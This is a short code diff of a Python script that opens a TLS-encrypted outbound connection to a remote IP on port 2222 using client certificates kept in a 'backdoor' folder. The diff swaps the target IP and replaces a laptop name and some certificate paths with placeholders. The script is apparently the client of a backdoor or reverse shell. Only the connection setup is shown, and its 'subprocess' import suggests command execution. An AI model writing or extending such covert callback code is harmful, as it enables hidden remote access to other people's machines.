@@ -6,13 +6,13 @@ import subprocess
 import ssl
 
 
-HOST = "169.254.60.95"
+HOST = "198.56.65.90"
 PORT = 2222
-SH = "Coles-Laptop-01"
+SH = "NAME"
 
 def main():
-    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="C:/backdoor/certs/server.crt")
-    ctx.load_cert_chain(certfile="C:/backdoor/certs/client.crt", keyfile="C:/backdoor/certs/client.key")
+    ctx = ssl.create_default_context(ssl.Purpose.SERVER_AUTH, cafile="C:/path/to/certs/server.crt")
+    ctx.load_cert_chain(certfile="C:/backdoor/certs/client.crt", keyfile="C:/path/to/certs/client.key")
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     sock = ctx.wrap_socket(s, server_hostname=SH) 
     sock.connect((HOST, PORT))
